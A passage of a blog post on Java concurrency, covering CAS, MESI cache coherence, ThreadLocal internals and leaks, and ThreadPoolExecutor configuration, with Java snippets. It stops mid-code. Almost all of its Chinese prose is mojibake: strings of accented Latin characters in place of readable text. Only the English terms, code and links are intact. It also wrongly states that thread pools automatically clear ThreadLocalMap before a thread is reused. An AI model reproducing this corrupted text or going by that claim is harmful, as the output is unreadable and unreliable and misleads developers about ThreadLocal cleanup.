<p>è€ŒCASçš„å…¨ç§°ä¸ºCompare-And-Swapï¼Œæ˜¯ä¸€æ¡CPUçš„åŸå­æŒ‡ä»¤ï¼Œå…¶ä½œç”¨æ˜¯è®©CPUæ¯”è¾ƒååŸå­åœ°æ›´æ–°æŸä¸ªä½ç½®çš„å€¼ï¼Œå…¶å®ç°æ–¹å¼æ˜¯åŸºäºç¡¬ä»¶å¹³å°çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå°±æ˜¯è¯´CASæ˜¯é ç¡¬ä»¶å®ç°çš„ï¼ŒJVMåªæ˜¯å°è£…äº†æ±‡ç¼–è°ƒç”¨ï¼Œé‚£äº›AtomicIntegerç±»ä¾¿æ˜¯ä½¿ç”¨äº†è¿™äº›å°è£…åçš„æ¥å£ã€‚</p>
<p>ä¾‹å¦‚ï¼šCore1å’ŒCore2å¯èƒ½ä¼šåŒæ—¶æŠŠä¸»å­˜ä¸­æŸä¸ªä½ç½®çš„å€¼Loadåˆ°è‡ªå·±çš„L1 Cacheä¸­ï¼Œå½“Core1åœ¨è‡ªå·±çš„L1 Cacheä¸­ä¿®æ”¹è¿™ä¸ªä½ç½®çš„å€¼æ—¶ï¼Œä¼šé€šè¿‡æ€»çº¿ï¼Œä½¿Core2ä¸­L1 Cacheå¯¹åº”çš„å€¼â€œå¤±æ•ˆâ€ï¼Œè€ŒCore2ä¸€æ—¦å‘ç°è‡ªå·±L1 Cacheä¸­çš„å€¼å¤±æ•ˆï¼ˆç§°ä¸ºCacheå‘½ä¸­ç¼ºå¤±ï¼‰åˆ™ä¼šé€šè¿‡æ€»çº¿ä»å†…å­˜ä¸­åŠ è½½è¯¥åœ°å€æœ€æ–°çš„å€¼ï¼Œå¤§å®¶é€šè¿‡æ€»çº¿çš„æ¥å›é€šä¿¡ç§°ä¸ºâ€œCacheä¸€è‡´æ€§æµé‡â€ï¼Œå› ä¸ºæ€»çº¿è¢«è®¾è®¡ä¸ºå›ºå®šçš„â€œé€šä¿¡èƒ½åŠ›â€ï¼Œå¦‚æœCacheä¸€è‡´æ€§æµé‡è¿‡å¤§ï¼Œæ€»çº¿å°†æˆä¸ºç“¶é¢ˆã€‚è€Œå½“Core1å’ŒCore2ä¸­çš„å€¼å†æ¬¡ä¸€è‡´æ—¶ï¼Œç§°ä¸ºâ€œCacheä¸€è‡´æ€§â€ï¼Œä»è¿™ä¸ªå±‚é¢æ¥è¯´ï¼Œé”è®¾è®¡çš„ç»ˆæç›®æ ‡ä¾¿æ˜¯å‡å°‘Cacheä¸€è‡´æ€§æµé‡ã€‚</p>
<p>è€ŒCASæ°å¥½ä¼šå¯¼è‡´Cacheä¸€è‡´æ€§æµé‡ï¼Œå¦‚æœæœ‰å¾ˆå¤šçº¿ç¨‹éƒ½å…±äº«åŒä¸€ä¸ªå¯¹è±¡ï¼Œå½“æŸä¸ªCore CASæˆåŠŸæ—¶å¿…ç„¶ä¼šå¼•èµ·æ€»çº¿é£æš´ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„æœ¬åœ°å»¶è¿Ÿï¼Œæœ¬è´¨ä¸Šåå‘é”å°±æ˜¯ä¸ºäº†æ¶ˆé™¤CASï¼Œé™ä½Cacheä¸€è‡´æ€§æµé‡ã€‚</p>
<p>ç›¸å…³å‚è€ƒï¼š</p>
<p>Cacheä¸€è‡´æ€§ï¼š<br>ä¸Šé¢æåˆ°Cacheä¸€è‡´æ€§ï¼Œå…¶å®æ˜¯æœ‰åè®®æ”¯æŒçš„ï¼Œç°åœ¨é€šç”¨çš„åè®®æ˜¯MESIï¼ˆæœ€æ—©ç”±Intelå¼€å§‹æ”¯æŒï¼‰ï¼Œå…·ä½“å‚è€ƒï¼š<a href="http://en.wikipedia.org/wiki/MESI_protocol%E3%80%82">http://en.wikipedia.org/wiki/MESI_protocolã€‚</a></p>
<p>Cacheä¸€è‡´æ€§æµé‡çš„ä¾‹å¤–æƒ…å†µï¼š<br>å…¶å®ä¹Ÿä¸æ˜¯æ‰€æœ‰çš„CASéƒ½ä¼šå¯¼è‡´æ€»çº¿é£æš´ï¼Œè¿™è·ŸCacheä¸€è‡´æ€§åè®®æœ‰å…³ï¼Œå…·ä½“å‚è€ƒï¼š<a href="http://blogs.oracle.com/dave/entry/biased_locking_in_hotspot">http://blogs.oracle.com/dave/entry/biased_locking_in_hotspot</a></p>
<p>NUMA(Non Uniform Memory Access Achitectureï¼‰æ¶æ„ï¼š<br>ä¸SMPå¯¹åº”è¿˜æœ‰éå¯¹ç§°å¤šå¤„ç†å™¨æ¶æ„ï¼Œç°åœ¨ä¸»è¦åº”ç”¨åœ¨ä¸€äº›é«˜ç«¯å¤„ç†å™¨ä¸Šï¼Œä¸»è¦ç‰¹ç‚¹æ˜¯æ²¡æœ‰æ€»çº¿ï¼Œæ²¡æœ‰å…¬ç”¨ä¸»å­˜ï¼Œæ¯ä¸ªCoreæœ‰è‡ªå·±çš„å†…å­˜ï¼Œé’ˆå¯¹è¿™ç§ç»“æ„æ­¤å¤„ä¸åšè®¨è®ºã€‚</p>
<h3 id="MESI-ç¼“å­˜ä¸€è‡´æ€§åè®®"><a href="#MESI-ç¼“å­˜ä¸€è‡´æ€§åè®®" class="headerlink" title="MESI(ç¼“å­˜ä¸€è‡´æ€§åè®®)"></a>MESI(ç¼“å­˜ä¸€è‡´æ€§åè®®)</h3><p>é¦–å…ˆï¼Œç”±äºCPUå’Œå†…å­˜çš„é€Ÿåº¦ä¸åŒ¹é…ï¼Œæ‰€ä»¥æœ‰äº†CPUé«˜é€Ÿç¼“å­˜ï¼Œç°ä»£CPUçš„ç¼“å­˜ä¸€èˆ¬åˆ†ä¸º3çº§ï¼ŒL1ï¼ŒL2ï¼ŒL3ï¼Œé€šå¸¸æ¥è®²ï¼Œä¸€ä¸ªå¤šæ ¸å¤„ç†å™¨ä¸Šï¼Œæ¯ä¸ªCPUæ ¸å¿ƒéƒ½æœ‰è‡ªå·±çš„L1å’ŒL2 Cacheï¼ŒL3 Cacheåˆ™æ˜¯è¢«æ‰€æœ‰æ ¸å¿ƒå…±äº«çš„ã€‚CPUè¯»å–æŸä¸€æ•°æ®æ—¶ï¼Œä¼šå…ˆä»ç¼“å­˜ä¸­è¯»ï¼Œè‹¥ç¼“å­˜read missï¼Œåˆ™å°†æ•°æ®ä»ä¸»å­˜åŠ è½½åˆ°ç¼“å­˜ã€‚ç¼“å­˜ä¸­çš„ä¸€ä¸ªæ•°æ®å•ä½ç§°ä¸ºä¸€ä¸ªç¼“å­˜è¡Œï¼ˆcache lineï¼‰ï¼Œé€šå¸¸æ˜¯64å­—èŠ‚ï¼Œä»ä¸»å­˜ä¸­åŠ è½½æ•°æ®åˆ°ç¼“å­˜ï¼Œä¸æ˜¯ä¸€æ¬¡åŠ è½½ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯ä¸€æ¬¡åŠ è½½ä¸€ä¸ªç¼“å­˜è¡Œã€‚</p>
<p>Modified</p>
<p>è¯¥cache lineåªå­˜åœ¨äºå½“å‰cacheï¼Œè€Œä¸å­˜åœ¨äºå…¶ä»–cacheï¼Œå¹¶ä¸”è¯¥cache lineçš„æ•°æ®ä¸ä¸»å­˜ä¸­çš„æ•°æ®ä¸ä¸€è‡´ï¼Œæ˜¯è„æ•°æ®ï¼ˆdirtyï¼‰</p>
<p>Exclusive</p>
<p>è¯¥cache lineåªå­˜åœ¨äºå½“å‰cacheï¼Œè€Œä¸å­˜åœ¨äºå…¶ä»–cacheï¼Œå¹¶ä¸”è¯¥cache lineçš„æ•°æ®ä¸ä¸»å­˜ä¸­çš„æ•°æ®ä¸€è‡´ï¼Œæ˜¯cleançš„</p>
<p>Shared</p>
<p>è¯¥cache lineå­˜åœ¨äºå¤šä¸ªcacheä¸­ï¼Œå¹¶ä¸”è¯¥cache line çš„æ•°æ®ä¸ä¸»å­˜ä¸­çš„æ•°æ®ä¸€è‡´</p>
<p>Invalid</p>
<p>è¯¥cache line å¤±æ•ˆ</p>
<h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><p>å¦‚æœä½ åˆ›å»ºäº†ä¸€ä¸ªThreadLocalå˜é‡ï¼Œé‚£ä¹ˆè®¿é—®è¿™ä¸ªå˜é‡çš„æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰è¿™ä¸ªå˜é‡çš„æœ¬åœ°å‰¯æœ¬ï¼Œè¿™ä¹Ÿæ˜¯ThreadLocalå˜é‡åçš„ç”±æ¥ã€‚ä»–ä»¬å¯ä»¥ä½¿ç”¨ getï¼ˆï¼‰ å’Œ setï¼ˆï¼‰ æ–¹æ³•æ¥è·å–é»˜è®¤å€¼æˆ–å°†å…¶å€¼æ›´æ”¹ä¸ºå½“å‰çº¿ç¨‹æ‰€å­˜çš„å‰¯æœ¬çš„å€¼ï¼Œä»è€Œé¿å…äº†çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p>
<h3 id="ThreadLocalä½¿ç”¨åœºæ™¯"><a href="#ThreadLocalä½¿ç”¨åœºæ™¯" class="headerlink" title="ThreadLocalä½¿ç”¨åœºæ™¯"></a>ThreadLocalä½¿ç”¨åœºæ™¯</h3><p>å‡è®¾å¤šä¸ªå‡½æ•°é€’å½’è°ƒç”¨, è¿™ä¸ªæ—¶å€™æœ€é‡Œé¢çš„é‚£ä¸ªå‡½æ•°æƒ³è¦è·å–åˆšå¼€å§‹çš„é‚£ä¸ªå‡½æ•°çš„å€¼, è¿™ä¸ªæ—¶å€™é‡Œé¢æœ‰æŸä¸ªå‡½æ•°æ˜¯ç³»ç»Ÿåº“é‡Œçš„å‡½æ•°, å‚æ•°ä¼ ä¸ä¸‹å», ç”¨staticå¤šçº¿ç¨‹ä¸‹ä¼šä¸å®‰å…¨,å¯ä»¥ç”¨ThreadLocal; </p>
<p>springé‡Œé¢@Transactional æ³¨è§£, æ ‡æ³¨æŸä¸ªæ–¹æ³•éœ€è¦æ”¯æŒäº‹åŠ¡,  è¿™ä¸ªæ–¹æ³•é‡Œé¢è°ƒç”¨äº†å‡ ä¸ªæ–¹æ³•, ç„¶åconnectionæ€ä¹ˆä¼ , æ¯ä¸€ä¸ªçº¿ç¨‹ç”¨çš„connectionå¿…é¡»æ˜¯åŒä¸€ä¸ª,ä¼šæ”¾åˆ°ThreadLocal;mybatiså…³äºåˆ†é¡µçš„å¤„ç†</p>
<h4 id="åœ¨é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„åœ°æ–¹"><a href="#åœ¨é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„åœ°æ–¹" class="headerlink" title="åœ¨é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„åœ°æ–¹"></a>åœ¨é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„åœ°æ–¹</h4><p>è·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯, æ—¢ç„¶è¦æŠŠç”¨æˆ·idä½œä¸ºé›†åˆåç§°çš„ä¸€éƒ¨åˆ†, æˆ‘ä»¬å¿…é¡»åœ¨è¯·æ±‚è¿›å…¥äº¤æ˜“æœåŠ¡æ—¶å°±è·å–åˆ°ç”¨æˆ·ä¿¡æ¯, å¹¶ä¸”å°†å½“å‰ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®š;</p>
<p>è·å–ç”¨æˆ·çš„æ€è·¯åˆ†æ: </p>
<ul>
<li>é¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’: ä¼˜ç‚¹:ç®€å•ã€æ–¹ä¾¿, ä»£ç é‡ä¸º0; ç¼ºç‚¹: ä¸å®‰å…¨, å› ä¸ºè°ƒç”¨è´­ç‰©è½¦CRUDçš„è¯·æ±‚æ—¶ä»é¡µé¢å‘è¿‡æ¥çš„, æˆ‘ä»¬ä¸èƒ½ç¡®å®šè¿™ä¸ªä¼ é€’è¿‡æ¥çš„idæ˜¯ä¸æ˜¯çœŸçš„æ˜¯ç”¨æˆ·çš„id</li>
<li>è‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯: ä¼˜ç‚¹: å®‰å…¨;  ç¼ºç‚¹: éœ€è¦é‡å¤æ£€éªŒJWT, å·²ç»åœ¨ç½‘å…³ä¸­åšè¿‡äº†, ä»£ç éº»çƒ¦;</li>
</ul>
<p>ä¸ºäº†åœ¨è¯·æ±‚è¿›å…¥æœåŠ¡åç›´æ¥èƒ½æ‹¿åˆ°ç”¨æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¦æˆªæ¯ä¸€ä¸ªè¿›å…¥controllerçš„è¯·æ±‚ï¼Œç»Ÿä¸€å®Œæˆç™»å½•ç”¨æˆ·çš„è·å–ï¼Œè¿™ä¸ªæ‹¦æˆªå¯ä»¥é€šè¿‡SpringMVCçš„é€šç”¨æ‹¦æˆªå™¨ï¼šHandlerInterceptoræ¥å®ç°ã€‚</p>
<h3 id="ThreadLocalåŸç†"><a href="#ThreadLocalåŸç†" class="headerlink" title="ThreadLocalåŸç†"></a>ThreadLocalåŸç†</h3><p>Threadç±»æœ‰ä¸¤ä¸ªå˜é‡,é»˜è®¤æƒ…å†µä¸‹è¿™ä¸¤ä¸ªå˜é‡éƒ½æ˜¯ nullï¼Œåªæœ‰å½“å‰çº¿ç¨‹è°ƒç”¨ ThreadLocal ç±»çš„ setæˆ–getæ–¹æ³•æ—¶æ‰åˆ›å»ºå®ƒä»¬ï¼Œå®é™…ä¸Šè°ƒç”¨è¿™ä¸¤ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ˜¯ThreadLocalMapç±»å¯¹åº”çš„ get()ã€set()æ–¹æ³•;</p>
<p>æœ€ç»ˆçš„å˜é‡æ˜¯æ”¾åœ¨äº†å½“å‰çº¿ç¨‹çš„ ThreadLocalMap ä¸­ï¼Œå¹¶ä¸æ˜¯å­˜åœ¨ ThreadLocal ä¸Šï¼ŒThreadLocal å¯ä»¥ç†è§£ä¸ºåªæ˜¯ThreadLocalMapçš„å°è£…ï¼Œä¼ é€’äº†å˜é‡å€¼ã€‚ ThrealLocal ç±»ä¸­å¯ä»¥é€šè¿‡Thread.currentThread()è·å–åˆ°å½“å‰çº¿ç¨‹å¯¹è±¡åï¼Œç›´æ¥é€šè¿‡getMap(Thread t)å¯ä»¥è®¿é—®åˆ°è¯¥çº¿ç¨‹çš„ThreadLocalMapå¯¹è±¡ã€‚</p>
<p>æ¯ä¸ªThreadä¸­éƒ½å…·å¤‡ä¸€ä¸ªThreadLocalMapï¼Œè€ŒThreadLocalMapå¯ä»¥å­˜å‚¨ä»¥ThreadLocalä¸º key ï¼ŒObject å¯¹è±¡ä¸º value çš„é”®å€¼å¯¹ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¸­å£°æ˜äº†ä¸¤ä¸ª ThreadLocal å¯¹è±¡çš„è¯ï¼Œä¼šä½¿ç”¨ Threadå†…éƒ¨éƒ½æ˜¯ä½¿ç”¨ä»…æœ‰é‚£ä¸ªThreadLocalMap å­˜æ”¾æ•°æ®çš„ï¼ŒThreadLocalMapçš„ key å°±æ˜¯ ThreadLocalå¯¹è±¡ï¼Œvalue å°±æ˜¯ ThreadLocal å¯¹è±¡è°ƒç”¨setæ–¹æ³•è®¾ç½®çš„å€¼ã€‚</p>
<p>Entryæ˜¯WeakReferenceçš„å­ç±», keyæ˜¯å¼±å¼•ç”¨, å†…å­˜ä¸è¶³çš„æ—¶å€™, threadlocalå¯¹è±¡ä¸”æ²¡æœ‰å¼ºå¼•ç”¨å¼•ç”¨çš„æ—¶å€™ä¼šè¢«gcå›æ”¶;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848057.png" alt="image-20210413202818052" style="zoom: 67%;" />



<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848071.png" alt="image-20210508151923558"></p>
<p>ThreadLocalå±äºç±»,è®¾ç½®ä¸ºstatic</p>
<h4 id="set-æºç "><a href="#set-æºç " class="headerlink" title="set()æºç "></a>set()æºç </h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T value)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line">        <span class="keyword">if</span> (map != <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">// thisä¸ºThreadLocalå¯¹è±¡</span></span><br><span class="line">            map.set(<span class="built_in">this</span>, value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            createMap(t, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="ThreadLocalå†…å­˜æ³„éœ²é—®é¢˜"><a href="#ThreadLocalå†…å­˜æ³„éœ²é—®é¢˜" class="headerlink" title="ThreadLocalå†…å­˜æ³„éœ²é—®é¢˜"></a>ThreadLocalå†…å­˜æ³„éœ²é—®é¢˜</h3><p>ThreadLocalMap ä¸­ä½¿ç”¨çš„ key ä¸º ThreadLocal çš„å¼±å¼•ç”¨,è€Œ value æ˜¯å¼ºå¼•ç”¨ã€‚æ‰€ä»¥ï¼Œå¦‚æœ ThreadLocal æ²¡æœ‰è¢«å¤–éƒ¨å¼ºå¼•ç”¨çš„æƒ…å†µä¸‹ï¼Œåœ¨åƒåœ¾å›æ”¶çš„æ—¶å€™ï¼Œkeyç›´æ¥ä¼šè¢«æ¸…ç†æ‰(ä¸ç®¡å†…å­˜æ˜¯å¦å¤Ÿ)ï¼Œè€Œ value ä¸ä¼šè¢«æ¸…ç†æ‰ã€‚è¿™æ ·ä¸€æ¥ï¼ŒThreadLocalMap ä¸­å°±ä¼šå‡ºç° key ä¸º null çš„ Entryã€‚å‡å¦‚æˆ‘ä»¬ä¸åšä»»ä½•æªæ–½çš„è¯ï¼Œvalue æ°¸è¿œæ— æ³•è¢« GC å›æ”¶ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯èƒ½ä¼šäº§ç”Ÿå†…å­˜æ³„éœ²ã€‚ThreadLocalMap å®ç°ä¸­å·²ç»è€ƒè™‘äº†è¿™ç§æƒ…å†µï¼Œåœ¨è°ƒç”¨ set()ã€get()ã€remove() æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šæ¸…ç†æ‰ key ä¸º null çš„è®°å½•ã€‚ä½†æ˜¯å‡è®¾é•¿æ—¶é—´ä¸æ‰§è¡Œget()å’Œset(), å°±ä¼šé€ æˆå†…å­˜æ³„æ¼, æ‰€ä»¥ä½¿ç”¨å®Œ ThreadLocalæ–¹æ³•å æœ€å¥½æ‰‹åŠ¨è°ƒç”¨remove()æ–¹æ³•;</p>
<h4 id="ThreadLocalMap-keyä¸ºä»€ä¹ˆç”¨å¼±å¼•ç”¨"><a href="#ThreadLocalMap-keyä¸ºä»€ä¹ˆç”¨å¼±å¼•ç”¨" class="headerlink" title="ThreadLocalMap keyä¸ºä»€ä¹ˆç”¨å¼±å¼•ç”¨?"></a>ThreadLocalMap keyä¸ºä»€ä¹ˆç”¨å¼±å¼•ç”¨?</h4><p>å‡è®¾æ˜¯å¼ºå¼•ç”¨, å³ä½¿æŠŠtlè®¾ç½®ä¸ºç©º, ä½†æ˜¯keyçš„å¼•ç”¨ä¾ç„¶æŒ‡å‘threadLocalå¯¹è±¡, æ‰€ä»¥ä¼šæœ‰å†…å­˜æ³„æ¼, è€Œä½¿ç”¨å¼±å¼•ç”¨ä¸ä¼š, ä½†æ˜¯è¿˜æ˜¯ä¼šå¯¼è‡´å†…å­˜æ³„æ¼çš„å­˜åœ¨, threadLocalè¢«å›æ”¶, keyçš„å€¼å˜æˆnull, åˆ™å¯¼è‡´æ•´ä¸ªvalueå†ä¹Ÿæ— æ³•è¢«è®¿é—®åˆ°, å› æ­¤ä¾ç„¶å­˜åœ¨å†…å­˜æ³„æ¼;</p>
<h3 id="åœ¨çº¿ç¨‹æ± ä¸­ThreadLocalä½¿ç”¨çš„é—®é¢˜"><a href="#åœ¨çº¿ç¨‹æ± ä¸­ThreadLocalä½¿ç”¨çš„é—®é¢˜" class="headerlink" title="åœ¨çº¿ç¨‹æ± ä¸­ThreadLocalä½¿ç”¨çš„é—®é¢˜"></a>åœ¨çº¿ç¨‹æ± ä¸­ThreadLocalä½¿ç”¨çš„é—®é¢˜</h3><p>æ¯ä¸ªçº¿ç¨‹è¢«æ‹¿å‡ºå»ç”¨çš„æ—¶å€™å‡å¦‚æ¸…ç†threadlocalmapçš„è¯, ä¸‹æ¬¡è¢«æ‹¿å»ä½¿ç”¨çš„æ—¶å€™å°±ä¼šå‡ºç°å¾ˆå¤šé—®é¢˜, ä¾‹å¦‚keyé‡å¤äº†; æ‰€ä»¥çº¿ç¨‹æ± ä½¿ç”¨å®Œä¼šç«‹åˆ»æ¸…ç†Threadlocalmapç„¶åå†æ”¾å›å»;</p>
<h2 id="çº¿ç¨‹æ± "><a href="#çº¿ç¨‹æ± " class="headerlink" title="çº¿ç¨‹æ± "></a>çº¿ç¨‹æ± </h2><p> ç±»æ¯”é“¶è¡ŒæŸœå°; 2ä¸ªæ ¸å¿ƒæŸœå°,å¼€äº†ä¹‹åå°±ä¸€ç›´ä¸å…³, ä¸€å…±5ä¸ªæŸœå°, å‰©ä¸‹3ä¸ªæŸœå°1ä¸ªæ—¶é—´æ²¡æœ‰ä»»åŠ¡å¤„ç†å°±æ’¤æ‰, æ—¶é—´å•ä½ä¸ºå°æ—¶,  ç­‰å¾…åŒºä¸€å…±æœ‰10æŠŠæ¤…å­, ç”Ÿäº§æŸœå°çš„å·¥å‚, 5ä¸ªæŸœå°æ»¡äº†å¹¶ä¸”ç­‰å¾…åŒºæ»¡äº†å°±æœ‰4ç§æ–¹å¼æ‹’ç»(ç›´æ¥æ‹’ç»å¹¶æŠ›å‡ºå¼‚å¸¸;ç›´æ¥æ‹’ç»,ä¸æŠ›å¼‚å¸¸;è®©ä»–å›åˆ°åˆ†é…ä»»åŠ¡çš„å…¬å¸å»å¤„ç†ä¸šåŠ¡,å‡è®¾å…¬å¸å…³é—¨åˆ™ä¸¢å¼ƒä»»åŠ¡;å°è¯•å°†ç¬¬ä¸€ä¸ªæŸœå°å–å‡ºç»™ä»–åŠç†ä¸šåŠ¡,ä¸æŠ›å¼‚å¸¸)</p>
<p>æ± åŒ–æŠ€æœ¯: äº‹å…ˆå‡†å¤‡å¥½ä¸€äº›èµ„æº, æœ‰äººè¦ç”¨, å°±æ¥æˆ‘è¿™é‡Œæ‹¿, ç”¨å®Œä¹‹åè¿˜ç»™æˆ‘; </p>
<p>å¥½å¤„: çº¿ç¨‹å¤ç”¨, å¯ä»¥æ§åˆ¶æœ€å¤§å¹¶å‘æ•°ã€ç®¡ç†çº¿ç¨‹;</p>
<h3 id="æ‰§è¡Œ-execute-æ–¹æ³•å’Œ-submit-æ–¹æ³•çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ"><a href="#æ‰§è¡Œ-execute-æ–¹æ³•å’Œ-submit-æ–¹æ³•çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ" class="headerlink" title="æ‰§è¡Œ execute()æ–¹æ³•å’Œ submit()æ–¹æ³•çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ"></a>æ‰§è¡Œ execute()æ–¹æ³•å’Œ submit()æ–¹æ³•çš„åŒºåˆ«æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</h3><p>execute()æ–¹æ³•ç”¨äºæäº¤ä¸éœ€è¦è¿”å›å€¼çš„ä»»åŠ¡ï¼Œæ‰€ä»¥æ— æ³•åˆ¤æ–­ä»»åŠ¡æ˜¯å¦è¢«çº¿ç¨‹æ± æ‰§è¡ŒæˆåŠŸä¸å¦;</p>
<p>submit()æ–¹æ³•ç”¨äºæäº¤éœ€è¦è¿”å›å€¼çš„ä»»åŠ¡ã€‚çº¿ç¨‹æ± ä¼šè¿”å›ä¸€ä¸ªFutureç±»å‹çš„å¯¹è±¡ï¼Œé€šè¿‡è¿™ä¸ªFutureå¯¹è±¡å¯ä»¥åˆ¤æ–­ä»»åŠ¡æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡Futureçš„get()æ–¹æ³•æ¥è·å–è¿”å›å€¼ï¼Œget()æ–¹æ³•ä¼šé˜»å¡å½“å‰çº¿ç¨‹ç›´åˆ°ä»»åŠ¡å®Œæˆï¼Œè€Œä½¿ç”¨getï¼ˆlong timeoutï¼ŒTimeUnit unitï¼‰&#96;æ–¹æ³•åˆ™ä¼šé˜»å¡å½“å‰çº¿ç¨‹ä¸€æ®µæ—¶é—´åç«‹å³è¿”å›ï¼Œè¿™æ—¶å€™æœ‰å¯èƒ½ä»»åŠ¡æ²¡æœ‰æ‰§è¡Œå®Œã€‚</p>
<h3 id="å¦‚ä½•åˆ›å»ºçº¿ç¨‹æ± "><a href="#å¦‚ä½•åˆ›å»ºçº¿ç¨‹æ± " class="headerlink" title="å¦‚ä½•åˆ›å»ºçº¿ç¨‹æ± "></a>å¦‚ä½•åˆ›å»ºçº¿ç¨‹æ± </h3><p>ã€Šé˜¿é‡Œå·´å·´ Java å¼€å‘æ‰‹å†Œã€‹ä¸­å¼ºåˆ¶çº¿ç¨‹æ± ä¸å…è®¸ä½¿ç”¨ Executors å»åˆ›å»ºï¼Œè€Œæ˜¯é€šè¿‡ ThreadPoolExecutor çš„æ–¹å¼ï¼Œè¿™æ ·çš„å¤„ç†æ–¹å¼è®©å†™çš„åŒå­¦æ›´åŠ æ˜ç¡®çº¿ç¨‹æ± çš„è¿è¡Œè§„åˆ™ï¼Œè§„é¿èµ„æºè€—å°½çš„é£é™©;</p>
<p>Executors è¿”å›çº¿ç¨‹æ± å¯¹è±¡çš„å¼Šç«¯å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>FixedThreadPool å’Œ SingleThreadExecutor</strong> ï¼š å…è®¸è¯·æ±‚çš„é˜Ÿåˆ—é•¿åº¦ä¸º Integer.MAX_VALUE ï¼Œå¯èƒ½å †ç§¯å¤§é‡çš„è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´ OOMã€‚</li>
<li><strong>CachedThreadPool å’Œ ScheduledThreadPool</strong> ï¼š å…è®¸åˆ›å»ºçš„çº¿ç¨‹æ•°é‡ä¸º Integer.MAX_VALUE ï¼Œå¯èƒ½ä¼šåˆ›å»ºå¤§é‡çº¿ç¨‹ï¼Œä»è€Œå¯¼è‡´ OOMã€‚</li>
<li>Executors.newFixedThreadPool()ï¼šæ— ç•Œé˜Ÿåˆ—ï¼Œå†…å­˜å¯èƒ½è¢«æ‰“çˆ†</li>
<li>Executors.newSingleThreadExecutor()ï¼šå•ä¸ªçº¿ç¨‹ï¼Œæ•ˆç‡ä½ï¼Œä¸²è¡Œã€‚</li>
<li>Executors.newCachedThreadPool()ï¼šæ²¡æœ‰æ ¸å¿ƒçº¿ç¨‹ï¼Œæœ€å¤§çº¿ç¨‹æ•°å¯èƒ½ä¸ºæ— é™å¤§ï¼Œå†…å­˜å¯èƒ½è¿˜ä¼šçˆ†æ‰ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 8:04 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">threadPoolExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">3</span>, max, <span class="number">3</span>, TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">10</span>), Executors.defaultThreadFactory(), <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">                threadPoolExecutor.execute(()-&gt; &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName());</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span 